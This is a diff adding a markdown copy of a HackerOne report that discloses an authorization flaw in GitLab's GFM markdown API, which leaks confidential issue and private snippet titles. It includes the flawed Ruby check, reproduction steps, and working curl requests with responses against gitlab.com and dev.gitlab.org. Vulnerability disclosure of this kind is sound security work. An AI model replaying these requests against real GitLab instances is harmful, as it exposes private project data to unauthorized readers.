@@ -1,0 +1,72 @@
+```
+Link:          https://hackerone.com/reports/398813
+By:            @jobert
+```
+
+Details:
+There is a vulnerability in the GFM markdown API that allows an attacker to read confidential issue titles and private snippet titles that the attacker is not allowed to see. There are two scenarios:
+
+ 1. At least one project is publicly accessible on the GitLab instance, which results in an attacker being able to access any confidential issue title / snippet title
+ 2. There are no publicly accessible repositories, requiring the attacker to be authenticated. When they are authenticated, they can still access any confidential issue title or private snippet.
+
+The root cause of this problem seems to be in the authorization check that is done in the markdown API controller (`lib/api/markdown.rb`):
+
+```ruby
+if params[:project]
+  project = Project.find_by_full_path(params[:project])
+
+  not_found!("Project") unless can?(current_user, :read_project, project)
+
+  context[:project] = project
+else
+  context[:skip_project_check] = true
+end
+```
+
+The only authorization check that is executed is whether the user can read the project. After that, no additional authorization check seems to be executed to make sure the user can read the (confidential) issues or private snippets.
+
+# Proof of concept
+To reproduce the vulnerability, follow the steps below.
+
+ - spin up a GitLab EE instance with the latest version (11.2.1-ee)
+ - sign in as a normal user and create a new, public project at `/projects/new` - let's assume its full path is `jobertabma/hello`
+ - in the new project, create a confidential issue with title `Secret title` - let's assume IID 1 was assigned to it
+ - as an unauthenticated user, execute the following command:
+
+```
+curl -H 'Content-Type: application/json' -d '{"project":"jobertabma/hello","text":"See #1","gfm":true}' 'https://gitlab.com/api/v4/markdown'
+```
+
+ - The response will contain the confidential issue's title (see `title` attribute):
+
+```json
+{
+  "html": "<p dir=\"auto\">See <a href=\"https://gitlab.com/jobertabma/hello/issues/1\" data-original=\"#1\" data-link=\"false\" data-link-reference=\"false\" data-project=\"8069942\" data-issue=\"13665976\" data-reference-type=\"issue\" data-container=\"body\" data-placement=\"bottom\" title=\"Secret title\" class=\"gfm gfm-issue has-tooltip\">#1</a></p>"
+}
+```
+
+The same works works for private snippet titles, by referencing them with `$:id`. In this case the primary key of the snippet model needs to be used, not an IID, as shown below:
+
+```
+$ curl -H 'Content-Type: application/json' -d '{"project":"jobertabma/hello","text":"See $1748062","gfm":true}' 'https://gitlab.com/api/v4/markdown'
+
+{
+  "html": "<p dir=\"auto\">See <a href=\"https://gitlab.com/jobertabma/hello/snippets/1748062\" data-original=\"$1748062\" data-link=\"false\" data-link-reference=\"false\" data-project=\"8069942\" data-snippet=\"1748062\" data-reference-type=\"snippet\" data-container=\"body\" data-placement=\"bottom\" title=\"aaa\" class=\"gfm gfm-snippet has-tooltip\">$1748062</a></p>"
+}
+```
+
+## Impact
+
+Right now the vulnerability only discloses the titles of confidential issues and private snippets. This may become worse at some point in case the GFM renderer would allow an issue or snippet to be fully rendered inline.
+
+I'm not completely understanding the bounty table in your BB policy by the way. This vulnerability seems to affect more than 50% of your customers, so perhaps it should be critical instead of high, but I leave that up to you.
+
+This also gives an attacker access to dev.gitlab.org issues, because it has one public repository: `gitlab-com/migration`. The following command can be used:
+
+```
+$ curl -H 'Content-Type: application/json' -d '{"project":"gitlab-com/migration","text":"See cookbooks/chef-repo#1","gfm":true}' 'https://dev.gitlab.org/api/v4/markdown' | jq
+
+{
+  "html": "<p dir=\"auto\">See <a href=\"https://dev.gitlab.org/cookbooks/chef-repo/issues/1\" data-original=\"cookbooks/chef-repo#1\" data-link=\"false\" data-link-reference=\"false\" data-project=\"273\" data-issue=\"1813\" data-reference-type=\"issue\" data-container=\"body\" data-placement=\"bottom\" title=\"Automatically knife master to Chef Server\" class=\"gfm gfm-issue has-tooltip\">cookbooks/chef-repo#1</a></p>"
+}
+```
